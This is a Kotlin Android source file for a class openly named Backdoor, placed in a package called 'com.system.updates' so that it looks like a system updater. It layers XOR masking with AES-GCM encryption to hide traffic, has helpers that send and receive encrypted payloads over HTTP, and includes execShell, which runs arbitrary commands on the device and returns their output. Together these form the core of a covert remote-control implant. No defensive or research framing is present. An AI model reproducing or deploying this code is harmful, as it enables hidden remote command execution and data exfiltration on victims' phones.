package com.system.updates

import android.content.Context
import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class Backdoor {
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x4A, 0x5B, 0x6C, 0x7D, 0x8E.toByte(), 0x9F.toByte(), 0xA0.toByte(), 0xB1.toByte())

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDec(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    fun httpGet(url: String): String {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val reader = BufferedReader(InputStreamReader(conn.inputStream))
            val response = reader.readText()
            reader.close()
            conn.disconnect()
            response
        } catch (e: Exception) {
            "error: ${e.message}"
        }
    }

    fun httpPost(url: String, data: String): String {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            conn.outputStream.write(data.toByteArray())
            conn.outputStream.flush()
            conn.outputStream.close()
            val reader = BufferedReader(InputStreamReader(conn.inputStream))
            val response = reader.readText()
            reader.close()
            conn.disconnect()
            response
        } catch (e: Exception) {
            "error: ${e.message}"
        }
    }

    fun sendEncrypted(url: String, payload: String, key: ByteArray): String {
        val raw = payload.toByteArray()
        val x = xor(raw)
        val enc = aesEnc(x, key)
        val b64 = Base64.encodeToString(enc, Base64.NO_WRAP)
        return httpPost(url, "data=$b64")
    }

    fun receiveEncrypted(url: String, key: ByteArray): String {
        val response = httpGet(url)
        val enc = Base64.decode(response, Base64.NO_WRAP)
        val dec = aesDec(enc, key)
        val plain = xor(dec)
        return String(plain)
    }

    fun execShell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(cmd)
            val r = BufferedReader(InputStreamReader(p.inputStream))
            val out = r.readText()
            r.close()
            p.waitFor()
            out
        } catch (e: Exception) {
            "exec error: ${e.message}"
        }
    }
}